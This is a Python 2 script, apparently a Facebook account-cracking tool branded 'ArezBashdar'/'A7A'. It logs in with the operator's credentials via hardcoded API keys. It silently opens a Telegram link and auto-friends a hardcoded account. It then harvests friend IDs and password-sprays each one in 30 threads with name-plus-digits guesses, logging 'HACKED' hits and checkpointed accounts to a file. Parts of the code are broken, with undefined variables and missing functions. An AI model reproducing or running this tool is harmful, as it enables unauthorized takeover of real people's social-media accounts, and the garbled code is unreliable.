import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.07)


logo ="""
\033[1;91m  AAA    RRRRRRRR   EEEEEEEEE    ZZZZZZZZZZ
\033[1;92m AAAAA   RR    RR   EE                  ZZ
\033[1;92mAA   AA  RRRRRR     EE                ZZ
\033[1;93mAAAAAAA  RRRR       EEEEEE          ZZ
\033[1;94mAA   AA  RR RR      EE            ZZ
\033[1;95mAA   AA  RR  RR     EEEEEEEEE   ZZZZZZZZZZZ

\033[1;99mMyTelegram : \033[1;91m@Ravo_M

\033[1;95mMyChanell  : \033[1;91m@ArezBashdar

\033[1;94m$$$$$$$$$$$$$$$$$$\033[1;91mArezBashdar\033[1;94m$$$$$$$$$$$$$$$$$$
    """
def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b\n[1;93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x9a\xa1\xe2\x9a\xa1\xe2\x9a\xa1..99% \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

def login():
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;31;40m\xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
        print ' \x1b[1;92mN o t e: \x1b[1;97mFACEBOOK DAXL BKA'
        print '\x1b[1;31;40m\xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
        id = raw_input('\x1b[1;92m[+] \x1b[1;93mID/Email\x1b[1;92m \xe2\x96\xba \x1b[1;96m')
        pwd = raw_input('\x1b[1;92m[+] \x1b[1;93mPassword\x1b[1;92m \xe2\x96\xba \x1b[1;35;40m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;36;40m[\xe2\x9c\x93] Login Successful...'
                os.system('xdg-open https://t.me/A7AeMARG')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] There is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;92m[!] Your Account is on Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;93mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(ots.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print '\x1b[1;91mYour Account is on Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;92mThere is no internet connection'
        keluar()

    os.system('clear')
    print logo
    print '      \x1b[0;33;40m      \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '      \x1b[0;33;40m      \xe2\x95\x91\x1b[1;32;40m[*] Name\x1b[1;34;40m: ' + nama + '             \x1b[0;33;40m\xe2\x95\x91'
    print '      \x1b[0;33;40m      \xe2\x95\x91\x1b[1;32;40m[*] ID  \x1b[1;34;40m: ' + id + '        \x1b[0;33;40m\xe2\x95\x91'
    print '      \x1b[0;33;40m      \xe2\x95\x91\x1b[1;32;40m[*] Subs\x1b[1;34;40m: ' + sub + '                      \x1b[0;33;40m\xe2\x95\x91'
    print '      \x1b[0;33;40m      \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[1;92m[1] \x1b[1;33;40mKURDSTAN'
    print '\x1b[1;92m[2] \x1b[1;33;40mUpdate TOOL'
    print '\x1b[1;92m[0] \x1b[1;33;40mLogout'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;31;40m>>> \x1b[1;32;40m')
    if unikers == '':
        print '\x1b[1;91mFill in correctly'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        cuper()
    elif unikers == '3':
        buper()
    elif unikers == '4':
        duper()
    elif unikers == '5':
        os.system('clear')
        print logo
        print ' \x1b[1;31;40m\xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1\n'
        os.system('git pull origin master')
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def cuper():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;32;40m[1] \x1b[1;33;40mCrackrdne hawrekant'
    print '\x1b[1;32;40m[2] \x1b[1;33;40mCrackrdn ba ID'
    print '\x1b[1;32;40m[3] \x1b[1;33;40mhackrdn ba wordlist'
    print '\x1b[1;32;40m[4] \x1b[1;33;40mCrack File'
    print '\x1b[1;32;40m[0] \x1b[1;33;40mBack'
    pilih_cuper()


def pilih_cuper():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;91m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_cuper()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;93m[\xe2\x9a\xa1] Hamu IDyakan \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;96m[*] Enter ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;31;40m[\xe2\x9a\xa1] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;92m[\xe2\x9a\xa1] ID nadozrawa!'
                raw_input('\n\x1b[1;96m[\x1b[1;94mBack\x1b[1;96m]')
                cuper()

            print '\x1b[1;35;40m[\xe2\x9a\xa1] Getting IDs...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            brute()
        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;96m[\xe2\x9a\xa1] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;35;40m[\xe2\x9a\xa1] \x1b[1;35;40mFile not found'
                raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
                cuper()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_cuper()
        print '\x1b[1;36;40m[\xe2\x9a\xa1] Total IDs : \x1b[1;94m' + str(len(id))
        jalan('\x1b[1;34;40m[\xe2\x9a\xa1] Please Wait\x1b[1;92m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32;40m[\xe2\x9a\xa1] Cloning\x1b[1;93m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m        \xe2\x9d\x88     \x1b[1;93mBo ragrtne hackaka CTRL+Z \x1b[1;94m    \xe2\x9d\x88'
    print ' \x1b[1;31;40m\xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
    jalan(' \x1b[1;93mTkaya chawareka...')
    print '\x1b[1;36;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'

    def main(arg):
        user = arg
        try:
            os.mkdir('output')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
                cek = open('output/cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '123123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
                    cek = open('output/cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
                        cek = open('output/cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass4)
                    else:
                        pass4 = b['first_name'] + '112233'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
                            cek = open('output/cp.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123321'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
                                cek = open('output/cp.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['first_name'] + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
                                    cek = open('output/cp.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = '112233445566'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
                                        cek = open('output/cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = '11221122'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass8 + ' >> ' + b['first_name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass8 + ' >> ' + b['first_name']
                                            cek = open('output/cp.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
    print '\x1b[1;32;40m[\xe2\x9a\xa1] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
    print '\x1b[1;34;40m[\xe2\x9a\xa1] CP File Has Been Saved : save/cp.txt'
    print logo5
    print '\n\t\t\x1b[1;33;40m\n \n\x1b[1;31;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1\n           '
    raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
    menu()


def duper():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;32;40m[1] \x1b[1;33;40mCrackrdne hawrekant'
    print '\x1b[1;32;40m[2] \x1b[1;33;40mCrackrdn ba ID'
    print '\x1b[1;32;40m[3] \x1b[1;33;40mhackrdn ba wordlist'
    print '\x1b[1;32;40m[4] \x1b[1;33;40mCrack File'
    print '\x1b[1;32;40m[0] \x1b[1;33;40mBack'
    pilih_duper()


def pilih_duper():
    peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;91m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_duper()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;93m[\xe2\x9a\xa1] Getting IDs \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;96m[\xe2\x9a\xa1] Enter ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;31;40m[\xe2\x9a\xa1] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;92m[\xe2\x9a\xa1] ID Not Found!'
                raw_input('\n\x1b[1;96m[\x1b[1;94mBack\x1b[1;96m]')
                duper()

            print '\x1b[1;35;40m[\xe2\x9a\xa1] Getting IDs...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            brute()
        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;96m[\xe2\x9a\xa1] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;35;40m[\xe2\x9a\xa1] \x1b[1;35;40mFile not found'
                raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
                duper()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_duper()
        print '\x1b[1;36;40m[\xe2\x9a\xa1] Total IDs : \x1b[1;94m' + str(len(id))
        jalan('\x1b[1;34;40m[\xe2\x9a\xa1] Please Wait\x1b[1;92m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32;40m[\xe2\x9a\xa1] Cloning\x1b[1;93m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m        \xe2\x9d\x88     \x1b[1;93mTo Stop Process Press CTRL+Z \x1b[1;94m    \xe2\x9d\x88'
